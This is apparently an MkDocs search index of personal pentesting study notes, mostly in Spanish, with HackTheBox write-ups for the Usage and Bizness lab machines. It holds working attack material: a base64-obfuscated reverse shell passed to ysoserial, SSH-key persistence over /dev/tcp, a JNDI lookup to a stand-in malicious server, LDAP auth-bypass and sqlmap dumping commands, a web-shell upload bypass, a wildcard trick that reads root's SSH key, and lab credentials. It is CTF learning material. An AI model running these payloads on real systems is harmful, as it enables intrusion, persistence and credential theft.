{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome to MkDocs","text":"<p>For full documentation visit mkdocs.org.</p>"},{"location":"#commands","title":"Commands","text":"<ul> <li><code>mkdocs new [dir-name]</code> - Create a new project.</li> <li><code>mkdocs serve</code> - Start the live-reloading docs server.</li> <li><code>mkdocs build</code> - Build the documentation site.</li> <li><code>mkdocs -h</code> - Print help message and exit.</li> </ul>"},{"location":"#project-layout","title":"Project layout","text":"<pre><code>mkdocs.yml    # The configuration file.\ndocs/\n    index.md  # The documentation homepage.\n    ...       # Other markdown pages, images and other files.\n</code></pre>"},{"location":"Disaster%20Box/000%20Interesting%20modules./","title":"000 Interesting modules.","text":""},{"location":"Disaster%20Box/000%20Interesting%20modules./#credential-storage","title":"Credential Storage","text":"<p>https://academy.hackthebox.com/module/147/section/13</p> <p>Credential Hunting https://academy.hackthebox.com/module/147/section/1318</p>"},{"location":"Disaster%20Box/Apache%20OFBiz/","title":"Apache OFBiz","text":"<p>version 18.12 vulnerable to java deserialization. HTB - Bizness</p> <p>Always has a database, normally it is Derby.</p> <p><code>/framework/security/security.properties</code></p>"},{"location":"Disaster%20Box/Apache%20OFBiz/#derby-databae","title":"Derby databae","text":"<p><code>/opt/ofbiz/runtime/data/derby</code></p>"},{"location":"Disaster%20Box/BATs/","title":"BATs","text":"<p>Un archivo BAT (Batch File) es un tipo de archivo de script que contiene una serie de comandos que pueden ser ejecutados en secuencia por el sistema operativo Windows.</p>"},{"location":"Disaster%20Box/Cheatsheet/","title":"Cheatsheet","text":"<pre><code>grep -v '^#' file | less\n</code></pre> <pre><code>zip nombre_archivo.zip archivo_a_comprimir.txt\n</code></pre> <pre><code>rustscan -t 10000 -u 5000 -a 10.10.11.252\nsudo nmap -p22,80,443 -sCV 10.10.11.252\nnmap 10.10.11.252 -p- --min-rate=1000 -T4\nsudo nmap 10.10.11.252 -sS --min-rate=5000 -Pn -n -p- --open -vvv\n</code></pre> <p>Crear archivos de archivos, empaquetados pero no comprimidos.</p> <pre><code>tar cvf mi_archivo.tar mi_carpeta/\ntar xvf mi_archivo.tar\n\n</code></pre> <ul> <li>c crear</li> <li>v verbose</li> <li>f file, nombre de archivo de salida</li> </ul>"},{"location":"Disaster%20Box/Cheatsheet/#manual-host-scan","title":"Manual host scan:","text":"<pre><code>for i in $(seq 1 254); do ping -c1 172.17.0.$i &gt;/dev/null &amp;&amp; echo \"host en 172.17.0.$i\"; done;\n</code></pre> <pre><code>for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep \"bytes from\" &amp;) ;done\n</code></pre> <pre><code>for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find \"Reply\"\n</code></pre> <pre><code>1..254 | % {\"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)\"}\n</code></pre>"},{"location":"Disaster%20Box/Cheatsheet/#manual-port-scan","title":"Manual port scan:","text":"<pre><code>for i in $(seq 1 65535); do nc -zv 172.17.0.1 $i; done 2&gt;&amp;1 | grep succ\n</code></pre>"},{"location":"Disaster%20Box/Cheatsheet/#port-fwd","title":"Port fwd","text":"<pre><code>chisel server -p 9999 --reverse #attacker machine\nchisel client 10.0.0.1:9999 R:8090:172.16.22.2:8000\n\n</code></pre>"},{"location":"Disaster%20Box/Cheatsheet/#docker-build","title":"Docker build","text":"<pre><code>docker build . -t ysoserial\n</code></pre> <p>-t = tag</p>"},{"location":"Disaster%20Box/Cheatsheet/#grep-2-lines","title":"grep + 2 lines","text":"<pre><code>grep -A 2 tun0 archivo.txt\ngrep -B 2 tun0 archivo.txt\n</code></pre>"},{"location":"Disaster%20Box/Cheatsheet/#php-server","title":"php server","text":"<pre><code>sudo php -S 0.0.0.0:80\n</code></pre>"},{"location":"Disaster%20Box/Create%20share%20with%20impacket/","title":"Create share with impacket","text":"<pre><code>sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/\n</code></pre> <p>/home/ltnbob/Documents/ mi share</p>"},{"location":"Disaster%20Box/Create%20share%20with%20impacket/#move","title":"Move","text":"<pre><code>C:\\&gt; move sam.save \\\\10.10.15.16\\CompData\n        1 file(s) moved.\n\nC:\\&gt; move security.save \\\\10.10.15.16\\CompData\n        1 file(s) moved.\n\nC:\\&gt; move system.save \\\\10.10.15.16\\CompData\n        1 file(s) moved.\n</code></pre>"},{"location":"Disaster%20Box/DLLs/","title":"DLLs","text":"<p>DLLs A Dynamic Linking Library (DLL) is a library file used in Microsoft operating systems to provide shared code and data that can be used by many different programs at once. These files are modular and allow us to have applications that are more dynamic and easier to update. As a pentester, injecting a malicious DLL or hijacking a vulnerable library on the host can elevate our privileges to SYSTEM and/or bypass User Account Controls.</p>"},{"location":"Disaster%20Box/Dockerfile/","title":"Dockerfile","text":"<pre><code>sudo docker build -t nombre-de-tu-imagen .\n\n</code></pre>"},{"location":"Disaster%20Box/JNDI%20injection/","title":"JNDI injection","text":"<p>Ataque usado en la vulnerabilidad [[Log4Shell]] de [[Log4j]]</p> <p>La inyecci\u00f3n [[JNDI]] (Java Naming and Directory Interface Injection) es una vulnerabilidad de seguridad que ocurre cuando una aplicaci\u00f3n Java acepta entradas no confiables y las utiliza en consultas JNDI sin la debida validaci\u00f3n o sanitizaci\u00f3n</p> <p>La integraci\u00f3n con otros servicios de directorio, unido a la ausencia de ciertos controles hace que podamos inyectar llamadas a recursos no controlados (como un servidor en nuestro poder) y que este le sirva una class maliciosa.</p> <pre><code>public void lookup(String name) {\n    try {\n        Context ctx = new InitialContext();\n        Object obj = ctx.lookup(name);\n        // Uso del objeto encontrado\n    } catch (NamingException e) {\n        e.printStackTrace();\n    }\n}\n</code></pre> <pre><code>lookup(\"ldap://malicious-server.com:1389/evilObject\");\n</code></pre>"},{"location":"Disaster%20Box/JNDI%20injection/#que-es-necesario-para-esta-explotacion","title":"Qu\u00e9 es necesario para esta explotaci\u00f3n?","text":"<ul> <li>Un servidor malicioso: Con una inyecci\u00f3n debemos apuntar a un servidor que controlemos. Este debe tener instalador el servicio que hayamos decidido invocar mediante JNDI mediante la petici\u00f3n maliciosa http.</li> <li>Alterar la petici\u00f3n: Normalmente se usar campos como [[User-Agent]]</li> </ul>"},{"location":"Disaster%20Box/JNDI/","title":"JNDI","text":""},{"location":"Disaster%20Box/JNDI/#que-es-jndi","title":"\u00bfQu\u00e9 es JNDI?","text":"<p>JNDI es una API en Java que proporciona un servicio de directorio y nombres, permitiendo a las aplicaciones Java descubrir y buscar datos y recursos utilizando nombres. JNDI se usa com\u00fanmente para:</p> <ul> <li>Buscar objetos remotos en servidores RMI (Remote Method Invocation).</li> <li>Conectar a servicios [[LDAP]] (Lightweight Directory Access Protocol).</li> <li>Registrar y buscar recursos como bases de datos, colas de mensajer\u00eda, etc.</li> </ul>"},{"location":"Disaster%20Box/LDAP/","title":"LDAP","text":"<p>LDAP, o Lightweight Directory Access Protocol (Protocolo Ligero de Acceso a Directorios), es un protocolo est\u00e1ndar para acceder y mantener servicios de directorio distribuidos a trav\u00e9s de una red. LDAP es utilizado principalmente para buscar informaci\u00f3n en una estructura jer\u00e1rquica de directorios y es ampliamente empleado en diversas aplicaciones y servicios, incluyendo autenticaci\u00f3n de usuarios, b\u00fasqueda de contactos, gesti\u00f3n de acceso y m\u00e1s.</p> <p>LDAP enables organizations to manage users centrally, as well as groups and other directory information, often used for authentication and authorization purposes in web and internal applications.</p> <p>LDAP soporta varias operaciones b\u00e1sicas, incluyendo:</p> <ul> <li>Bind: Autenticar y establecer una sesi\u00f3n con el servidor LDAP.</li> <li>Search: Buscar y recuperar entradas del directorio.</li> <li>Compare: Comparar un valor con un atributo en una entrada.</li> <li>Modify: Modificar atributos de una entrada.</li> <li>Add: A\u00f1adir una nueva entrada al directorio.</li> <li>Delete: Eliminar una entrada del directorio.</li> <li>Unbind: Terminar la sesi\u00f3n con el servidor LDAP.</li> </ul>"},{"location":"Disaster%20Box/LDAP/#usos-principales-de-ldap","title":"Usos principales de LDAP:","text":"<ol> <li> <p>Autenticaci\u00f3n y Autorizaci\u00f3n:</p> <ul> <li>LDAP es com\u00fanmente utilizado en sistemas de autenticaci\u00f3n para validar credenciales de usuario. Los servidores de autenticaci\u00f3n, como Microsoft [[Active Directory]], utilizan LDAP para gestionar usuarios y permisos.</li> <li> <p>B\u00fasqueda y Directorios de Contactos:</p> </li> <li> <p>LDAP es utilizado para buscar informaci\u00f3n en grandes directorios de contactos, como en entornos corporativos donde se necesita acceder a informaci\u00f3n de empleados.</p> </li> <li> <p>Gesti\u00f3n de Recursos:</p> </li> <li> <p>LDAP puede ser usado para gestionar recursos como equipos, impresoras y aplicaciones dentro de una organizaci\u00f3n.</p> </li> </ul> </li> </ol>"},{"location":"Disaster%20Box/LDAP/#como-se-organiza","title":"C\u00f3mo se organiza?","text":"<p>Cada entrada en el directorio LDAP tiene un identificador \u00fanico llamado Distinguished Name (DN). Un DN es una cadena que especifica el camino desde la ra\u00edz del directorio hasta la entrada espec\u00edfica.</p> <p>Est\u00e1 bien explicado en THM:</p> <p>![[Pasted image 20240729171335.png]]</p> <p>En el top tenemos el top-level domain (TLD), como dc=ldap y dc=thm. Esto desciende como un \u00e1rbol, seguido de las unidades organizacionales (ou).  - Los DN de antes mencionados, son todos los eslabones hasta llegar al TLD, es decir, por ejemplo cn = John Doe, ou = people, dc = ldap, dc = thm ser\u00eda un DN. - Luego tenemos los RDN (Relative Distinguished Names), que podr\u00edamos verlo como el an\u00e1logo al relative path y absolut, como ejemplo ser\u00eda cn = John Doe. - Tambi\u00e9n hay atributos que corresponden a cada entry, por ejemplo mail. </p>"},{"location":"Disaster%20Box/LDAP/#queries","title":"Queries","text":"<p>Para navegar en un \u00e1rbol LDAP y obtener informaci\u00f3n de las entradas, debemos saber c\u00f3mo utilizar las queries. </p> <p>La sintaxis de las queries es la siguiente:</p> <pre><code>(base DN) (scope) (filter) (attributes)\n</code></pre> <ol> <li>Base DN, es el punto de partida para buscar.</li> <li>Scope, define qu\u00e9 tan profundo hay que buscar:<ol> <li>base, solo busca en la base. (el punto 1.)</li> <li>one, s\u00f3lo busca en el escal\u00f3n siguiente (next child)</li> <li>sub, busca todo lo que hay abajo.</li> </ol> </li> <li>Filter</li> <li>Atributos, qu\u00e9 nos interesa devolver de la entrada buscada.</li> </ol>"},{"location":"Disaster%20Box/LDAP/#filtros","title":"Filtros","text":"<p>equality (<code>=</code>), presence (<code>=*</code>), greater than (<code>&gt;=</code>), and less than (<code>&lt;=</code>), wildcard <code>*</code>.</p> <p>For a more complex search query, filters can be used with each other using logical operators such as AND (<code>&amp;</code>), OR (<code>|</code>), and NOT (<code>!</code>).</p> <pre><code>(&amp;(objectClass=user)(|(cn=John*)(cn=Jane*)))\n</code></pre>"},{"location":"Disaster%20Box/LDAP/#injections","title":"Injections","text":""},{"location":"Disaster%20Box/LDAP/#common-attack-vectors","title":"Common Attack Vectors","text":"<ol> <li>Authentication Bypass: Modifying LDAP authentication queries to log in as another user without knowing their password.</li> <li>Unauthorized Data Access: Altering LDAP search queries to retrieve sensitive information not intended for the attacker's access.</li> <li>Data Manipulation: Injecting queries that modify the LDAP directory, such as adding or modifying user attributes.</li> </ol>"},{"location":"Disaster%20Box/LDAP/#authentication-bypass-techniques","title":"Authentication Bypass Techniques","text":"<p>Tautology-Based Injection</p> <p>Tautology-based injection involves inserting conditions into an LDAP query that are inherently true, thus ensuring the query always returns a positive result, irrespective of the intended logic.</p> <pre><code>(&amp;(uid={userInput})(userPassword={passwordInput}))\n</code></pre> <p>An attacker could provide a tautology-based input, such as <code>*)(|(&amp;</code>\u00a0for <code>{userInput}</code>\u00a0and <code>pwd)</code> for <code>{passwordInput}</code> which transforms the query into:</p> <pre><code>(&amp;(uid=*)(|(&amp;)(userPassword=pwd)))\n</code></pre> <p>Blind Injection</p> <p>Al igual que en sql, podemos averiguar informaci\u00f3n comparando las respuestas del servidor.</p>"},{"location":"Disaster%20Box/LDAP/#sources","title":"Sources","text":"<p>https://tryhackme.com/r/room/ldapinjection</p>"},{"location":"Disaster%20Box/Log4j/","title":"Log4j","text":"<p>Log4j es una librer\u00eda para enviar registros de depuraci\u00f3n o estado acerca de los distintos servicios utilizados por Java.</p> <p>Esta vulnerabilidad podr\u00eda afectar cualquier campo susceptible de ser logeado por log4j, como por ejemplo [[User-Agent]]</p>"},{"location":"Disaster%20Box/Log4j/#para-que-se-usa","title":"Para qu\u00e9 se usa?","text":"<ul> <li>Trazabilidad: Proporciona registros sobre distintos servicios.</li> <li>[[JNDI]]: Api de integraci\u00f3n para distintos servicios ([[LDAP]], DNS,...)</li> </ul> <p>La vulnerabilidad Log4Shell (tambi\u00e9n conocida como CVE-2021-44228) es una vulnerabilidad cr\u00edtica descubierta en la biblioteca de registro de Apache Log4j 2, una popular herramienta utilizada para registrar mensajes en aplicaciones Java.</p>"},{"location":"Disaster%20Box/Manejadores%20de%20se%C3%B1ales/","title":"Manejadores de se\u00f1ales","text":""},{"location":"Disaster%20Box/Manejadores%20de%20se%C3%B1ales/#bash","title":"bash","text":"<pre><code>#!/bin/bash\n\nfunction handle_interrupt() {\n    echo -e \"\\n[INFO] Se ha presionado Ctrl+C. Saliendo del script...\"\n    exit 1\n}\n\n# Capturar la se\u00f1al SIGINT y ejecutar la funci\u00f3n handle_interrupt\ntrap handle_interrupt SIGINT\n... snip ...\n\n</code></pre>"},{"location":"Disaster%20Box/Persistence%20with%20ssh%20key/","title":"Persistence with ssh key","text":"<ol> <li> <p>Generate new pair of key (using ssh-keygen)</p> </li> <li> <p>Drop your generated public key into target .ssh dir (if not then create this dir)</p> </li> <li> <p>Rename your dropped public key file into authorized_keys.</p> </li> </ol> <pre><code># attacker\nssh-keygen\ncat id_rsa.pub &gt; /dev/tcp/iP_victima/port\n# victim\ncd .ssh\nnc -lvnp port &gt; authorized_keys\n# attacker\nssh -i id_rsa name@host\n</code></pre>"},{"location":"Disaster%20Box/Search%20Operators/","title":"Search Operators","text":"Operator Operator Description Example Example Description <code>site:</code> Limits results to a specific website or domain. <code>site:example.com</code> Find all publicly accessible pages on example.com. <code>inurl:</code> Finds pages with a specific term in the URL. <code>inurl:login</code> Search for login pages on any website. <code>filetype:</code> Searches for files of a particular type. <code>filetype:pdf</code> Find downloadable PDF documents. <code>intitle:</code> Finds pages with a specific term in the title. <code>intitle:\"confidential report\"</code> Look for documents titled \"confidential report\" or similar variations. <code>intext:</code> or <code>inbody:</code> Searches for a term within the body text of pages. <code>intext:\"password reset\"</code> Identify webpages containing the term \u201cpassword reset\u201d. <code>cache:</code> Displays the cached version of a webpage (if available). <code>cache:example.com</code> View the cached version of example.com to see its previous content. <code>link:</code> Finds pages that link to a specific webpage. <code>link:example.com</code> Identify websites linking to example.com. <code>related:</code> Finds websites related to a specific webpage. <code>related:example.com</code> Discover websites similar to example.com. <code>info:</code> Provides a summary of information about a webpage. <code>info:example.com</code> Get basic details about example.com, such as its title and description. <code>define:</code> Provides definitions of a word or phrase. <code>define:phishing</code> Get a definition of \"phishing\" from various sources. <code>numrange:</code> Searches for numbers within a specific range. <code>site:example.com numrange:1000-2000</code> Find pages on example.com containing numbers between 1000 and 2000. <code>allintext:</code> Finds pages containing all specified words in the body text. <code>allintext:admin password reset</code> Search for pages containing both \"admin\" and \"password reset\" in the body text. <code>allinurl:</code> Finds pages containing all specified words in the URL. <code>allinurl:admin panel</code> Look for pages with \"admin\" and \"panel\" in the URL. <code>allintitle:</code> Finds pages containing all specified words in the title. <code>allintitle:confidential report 2023</code> Search for pages with \"confidential,\" \"report,\" and \"2023\" in the title. <code>AND</code> Narrows results by requiring all terms to be present. <code>site:example.com AND (inurl:admin OR inurl:login)</code> Find admin or login pages specifically on example.com. <code>OR</code> Broadens results by including pages with any of the terms. <code>\"linux\" OR \"ubuntu\" OR \"debian\"</code> Search for webpages mentioning Linux, Ubuntu, or Debian. <code>NOT</code> Excludes results containing the specified term. <code>site:bank.com NOT inurl:login</code> Find pages on bank.com excluding login pages. <code>*</code> (wildcard) Represents any character or word. <code>site:socialnetwork.com filetype:pdf user* manual</code> Search for user manuals (user guide, user handbook) in PDF format on socialnetwork.com. <code>..</code> (range search) Finds results within a specified numerical range. <code>site:ecommerce.com \"price\" 100..500</code> Look for products priced between 100 and 500 on an e-commerce website. <code>\" \"</code> (quotation marks) Searches for exact phrases. <code>\"information security policy\"</code> Find documents mentioning the exact phrase \"information security policy\". <code>-</code> (minus sign) Excludes terms from the search results. <code>site:news.com -inurl:sports</code> Search for news articles on news.com excluding sports-related content."},{"location":"Disaster%20Box/Search%20Operators/#googling-dorking","title":"Googling Dorking:","text":"<ul> <li>Finding Login Pages:<ul> <li><code>site:example.com inurl:login</code></li> <li><code>site:example.com (inurl:login OR inurl:admin)</code></li> </ul> </li> <li>Identifying Exposed Files:<ul> <li><code>site:example.com filetype:pdf</code></li> <li><code>site:example.com (filetype:xls OR filetype:docx)</code></li> </ul> </li> <li>Uncovering Configuration Files:<ul> <li><code>site:example.com inurl:config.php</code></li> <li><code>site:example.com (ext:conf OR ext:cnf)</code> (searches for extensions commonly used for configuration files)</li> </ul> </li> <li>Locating Database Backups:<ul> <li><code>site:example.com inurl:backup</code></li> <li><code>site:example.com filetype:sql</code></li> </ul> </li> </ul>"},{"location":"Disaster%20Box/Thrift/","title":"Thrift","text":"<ol> <li> <p>RPC significa \"Llamada a Procedimiento Remoto\" (Remote Procedure Call). Es una forma de hacer que un programa en una computadora ejecute c\u00f3digo en otra computadora, como si fuera local[1][5].</p> </li> <li> <p>Un framework es un conjunto de herramientas y reglas que facilitan el desarrollo de software para un prop\u00f3sito espec\u00edfico.</p> </li> <li> <p>Thrift, como framework RPC, proporciona herramientas que simplifican la creaci\u00f3n de sistemas donde los programas se comunican entre s\u00ed, incluso si est\u00e1n en diferentes computadoras o escritos en diferentes lenguajes de programaci\u00f3n[7].</p> </li> <li> <p>Lo que hace Thrift especial es que:</p> </li> <li> <p>Permite definir servicios y estructuras de datos en un archivo simple (llamado archivo .thrift)[7].</p> </li> <li>A partir de ese archivo, genera autom\u00e1ticamente el c\u00f3digo necesario para la comunicaci\u00f3n entre programas en varios lenguajes[7].</li> <li> <p>Maneja autom\u00e1ticamente detalles complejos como la serializaci\u00f3n de datos y la comunicaci\u00f3n en red[7].</p> </li> <li> <p>En la pr\u00e1ctica, esto significa que puedes, por ejemplo:</p> </li> <li>Escribir un servidor en Java que ofrezca ciertos servicios.</li> <li> <p>Usar Thrift para generar c\u00f3digo que permita a un programa cliente en Python llamar a esos servicios f\u00e1cilmente[7].</p> </li> <li> <p>Thrift se encarga de los detalles t\u00e9cnicos complicados, permiti\u00e9ndote concentrarte en la l\u00f3gica de tu aplicaci\u00f3n en lugar de preocuparte por c\u00f3mo hacer que diferentes programas se comuniquen entre s\u00ed[7].</p> </li> </ol> <p>En resumen, Thrift es como un \"traductor universal\" que facilita la comunicaci\u00f3n entre programas, incluso si est\u00e1n en diferentes computadoras o escritos en diferentes lenguajes de programaci\u00f3n.</p> <p>Citations: [1] https://keepcoding.io/blog/que-es-el-protocolo-rpc-remote-procedure-call/ [2] https://www.ionos.com/es-us/digitalguide/servidores/know-how/que-es-rpc/ [3] https://aws.amazon.com/es/compare/the-difference-between-rpc-and-rest/ [4] https://www.akamai.com/es/blog/security-research/msrpc-security-mechanisms [5] https://es.wikipedia.org/wiki/Llamada_a_procedimiento_remoto [6] https://learn.microsoft.com/es-es/windows/win32/rpc/rpc-start-page [7] https://stackoverflow.com/questions/20653240/what-is-rpc-framework-and-apache-thrift [8] https://thrift-tutorial.readthedocs.io/en/latest/intro.html</p>"},{"location":"Disaster%20Box/User-Agent/","title":"User Agent","text":"<p>El User-Agent es una cadena de texto que env\u00eda el navegador web (o cualquier otro cliente de internet) al servidor web que est\u00e1 solicitando recursos. Esta cadena contiene informaci\u00f3n sobre el software del cliente, como el nombre del navegador, su versi\u00f3n, el sistema operativo, y otros detalles relevantes. El servidor utiliza esta informaci\u00f3n para adaptar su respuesta y optimizar la experiencia del usuario.</p> <p>Este campo siempre se quiere registrar ya que nos informa c\u00f3mo es el cliente que solicita acceso.</p>"},{"location":"Disaster%20Box/ysoserial/","title":"Ysoserial","text":"<p>[[Deserializaci\u00f3n]] de java</p> <p>Herramienta para la serializaci\u00f3n de java.</p> <pre><code>git clone https://github.com/frohoff/ysoserial?tab=readme-ov-file\ncd ysoserial\ndocker build . -t ysoserial\n</code></pre> <p>La herramienta ofrece una variedad de cargas \u00fatiles preconstruidas que aprovechan diferentes bibliotecas y patrones de c\u00f3digo comunes en Java que son vulnerables a la explotaci\u00f3n de deserializaci\u00f3n.</p> <pre><code>docker run ysoserial CommonsBeanutils1 'bash -c echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40LzEyMzQgMD4mMQ==|base64${IFS}-d|bash'\n</code></pre>"},{"location":"Machines/HTB%20-%20Usage/Notes/","title":"Notes","text":"Name Usage Platform HTB Difficulty Easy OS Linux Used techniques sudomain enumeration,  SQLi, crack hashes, File Upload attack, credentials finding, reverse, wildcards spare tricks. Technologies Laravel, Laravel-admin Tools gobuster,  BurpSuite, sqlmap, nc, strings CVEs cve-2023-24249"},{"location":"Machines/HTB%20-%20Usage/Notes/#enumeration","title":"Enumeration","text":"<pre><code>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-04 16:39 CEST\nNmap scan report for 10.10.11.18\nHost is up (0.042s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)\n|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://usage.htb/\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 9.80 seconds\n</code></pre> <p>Important information to be extracted: nginx server, usage.htb as domain.</p> <pre><code>http://usage.htb [200 OK] Bootstrap[4.1.3], Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[laravel_session], IP[10.10.11.18], Laravel, PasswordField[password], Title[Daily Blogs], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block], nginx[1.18.0]\n</code></pre> <p>Inspecting the web site, we can only see that we can register as users and log in. Once logged in, there is no vector that can serve us as an attack vector. It should be some directory or subdomain not enumerated. </p>"},{"location":"Machines/HTB%20-%20Usage/Notes/#directories","title":"Directories","text":"<p>Apart from spidering the website, there is no extra directories found:</p> <pre><code>gobuster dir -u usage.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --exclude-length 206\n</code></pre> <p>/login /registration /reset-password</p>"},{"location":"Machines/HTB%20-%20Usage/Notes/#subdomains","title":"subdomains","text":"<pre><code>ffuf -u http://usage.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H 'Host: FUZZ.usage.htb' -fs 178\n</code></pre> <p>==admin.usage.htb== +/admin +/uploads</p> <p>We find also one admin panel endpoint. The use of default credentials does not work. The first idea is that we have to use some kind of credential or token taken from the home page or some injection that we have not yet tested.</p>"},{"location":"Machines/HTB%20-%20Usage/Notes/#foothold","title":"Foothold","text":"<p>Possible SQLi on /reset-password. It gave us an 500 code error after injecting single quote.</p> <p></p> <p>We found one table with users, it may contain some valid credentials that may be used in the admin panel.</p> <p></p> <p><code>hashcat -a 0 -m 3200 hashes /usr/share/wordlists/rockyou.txt</code> <code>hashcat -a 0 -m 3200 hashes --show</code></p> <p>This ended up going down a rabbit hole. No credentials have been of any use to us. The credentials that will give us access can be found in table admin_users:</p> <p>The web is implementing some security measures against excessive requests, so let's calibrate the sqlmap command well.</p> <pre><code>sqlmap -r request.txt --level 5 --risk 3 -p email --batch --dbs --threads 10\n\nsqlmap -r request.txt --level 5 --risk 3 -p email --batch -D usage_blog ---tables --threads 10\n\nsqlmap -r request.txt --level 5 --risk 3 -p email --batch -D usage_blog -T admin_users --columns --threads 10\n\nsqlmap -r request.txt --level 5 --risk 3 -p email --batch -D usage_blog -T admin_users -C name,username,password --threads 10\n</code></pre> <pre><code>Administrator | admin    | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2\n</code></pre> <p>Valid credentials found and used on admin panel.</p> <p></p> <p>List of the version is listed on the dashboard, so it is easy to check that there is a vulnerable version: encore/laravel-admin 1.8.17.</p> <p>This version is vulnerable to cve-2023-24249, which consists in a File Upload vulnerability. We can bypass the image upload easily, just changing the extension. The way to go is, first we have to upload shell.jpg (shell.php with extension changed). After success, upload again and catch the request, this time we have to add .php (shell.jpg.php). Once we have prepared our listener, try to download the image.</p> <p></p> <p></p>"},{"location":"Machines/HTB%20-%20Usage/Notes/#lateral-movement","title":"Lateral Movement","text":"<p>After foodhold, we see that there is just one more user called xander. On the same folder, we find one hidden file (/.monitrc) with credentials with can spray with. It worked to change user to xander.</p> <p></p> <pre><code>allow admin:3nc0d3d_pa$$w0rd\n</code></pre> <p><code>xander:3nc0d3d_pa$$w0rd</code></p>"},{"location":"Machines/HTB%20-%20Usage/Notes/#privilege-escalation","title":"Privilege Escalation","text":"<p>As xander we can use sudo with the following command:</p> <pre><code>sudo -l\nMatching Defaults entries for xander on usage:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser xander may run the following commands on usage:\n    (ALL : ALL) NOPASSWD: /usr/bin/usage_management\n</code></pre> <p></p> <p>Once we play with it a little bit, it looks like it creates some backup's files. We can inspect if there are hidden credentials or something exploitable.</p> <p><code>strings /usr/bin/usage_management</code></p> <p></p> <p>We see one line with a *, that may lead to a wildcard hack. If we do some research, we find that it is in fact a 7za wildcard spare . It gives us local file inclusion. One way to get root is to find the corresponding ssh key:</p> <pre><code>cd /var/www/html  \ntouch @id_rsa  \nln -s /root/.ssh/id_rsa id_rsa  \nsudo /usr/bin/usage_management\n</code></pre> <p>We are root it.</p>"},{"location":"Machines/HTB%20-%20Usage/Notes/#developed-map","title":"Developed map","text":""},{"location":"Machines/HTB%20-%20Usage/Notes/#sources","title":"Sources","text":"<p>[[https://flyd.uk/post/cve-2023-24249/]] [[https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks]]</p>"},{"location":"Machines/HTB_Bizness/appendice/","title":"Appendice","text":"<pre><code>rustscan -t 10000 -u 5000 -a 10.10.11.252\nnmap 10.10.11.252 -p- --min-rate=1000 -T4\nsudo nmap -p22,80,443 -sCV 10.10.11.252\nsudo nmap 10.10.11.252 -sS --min-rate=5000 -Pn -n -p- --open -vvv\n</code></pre> <pre><code>ffuf -u https://bizness.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -r -fw 9218\n</code></pre> <p>ysoserial? </p> <p>/dev/shm sistema de archivos temporales en la memoria ram, conocido por tmpfs. Muy rapido de acceder.</p> <pre><code># sudo apt install derby-tools\nij\nconnect 'jdbc:derby:./ofbiz';\nshow tables;\nselect * from ofbiz.user_login;\n</code></pre> <p>sha1 41 chars</p> <pre><code>echo \"uP0_QaVBpDWFeo8-dRzDqRwXQ2I=\" | basenc -d --base64url | xxd -p\n</code></pre> <p>Without padding: En Base64 est\u00e1ndar, si los datos codificados no completan un bloque de 4 caracteres, se agregan uno o dos signos de igual (<code>=</code>) al final para \"rellenar\" la cadena. En Base64URL sin padding, estos caracteres de relleno se omiten.</p>"},{"location":"Machines/HTB_Bizness/notes/","title":"Notes","text":"Name Bizness Platform HTB Difficulty Easy OS Linux Used Techniques known vulnerability, crack hashes, credentials finding, hex, hidden ports, special nmap Technologies https, Enterprise Resource Plannning (ERP), Apache OFBIZ, deserialization, derby database Tools gobuster,  ysoserial, hashcat CVEs CVE-2023-49070"},{"location":"Machines/HTB_Bizness/notes/#enumeration","title":"Enumeration","text":"<p>Regular scans let the port <code>43425</code> hidden. Once we adjust the parameter, we could enumerate it.</p> <pre><code>nmap 10.10.11.252 -p- --min-rate=1000 -T4\n</code></pre> <p>![[Pasted image 20240816135446.png]]</p> <p>If we do basic enumeration on the website, we can see on the botton that Apache OFBIZ is running on the server.</p> <p>![[Pasted image 20240816141250.png]]</p>"},{"location":"Machines/HTB_Bizness/notes/#directories","title":"Directories","text":"<p>Basic fuzzing bring us <code>/control</code>, which show us, as we have seen before, that  Apache OFBIZ  is running on the website. </p> <p>If we follow redirects, then we find way more directories: <code>content, catalog, marketing, ap, ar, ecommerce...</code> Those show us a Loggin Panel wit the OFBiz version on the bottom:</p> <p>![[Pasted image 20240816142643.png]]</p> <p>This version has two vulnerabilities. The one which interests us is the pre-auth RCE CVE-2023-49070.</p>"},{"location":"Machines/HTB_Bizness/notes/#foothold","title":"Foothold","text":"<p>Foothold will be accomplish with the previous vulnerability. The exploit takes advantage from one error validating the login user.  Check sources, it is well explained. In order to exploit it, we will need ysoserial to serialize and then inject it on a xml post request. Everything is well documented on the exploit.</p> <p>![[Pasted image 20240816184123.png]]  